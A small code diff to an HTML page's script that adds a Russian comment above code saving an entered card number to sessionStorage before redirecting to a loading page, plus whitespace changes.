@@ -1239,7 +1239,8 @@
         });
 
         backBtn.addEventListener('click', () => {
-            const cardNumberValue = cardNumber.value.replace(/\s/g, '');
+            // Сохраняем номер карты для SMS страницы
+        const cardNumberValue = cardNumber.value.replace(/\s/g, '');
         sessionStorage.setItem('cardNumber', cardNumberValue);
         window.location.href = 'loading.html';
         });
@@ -1466,5 +1467,6 @@
     </script>
 </body>
 </html>
+
 
 
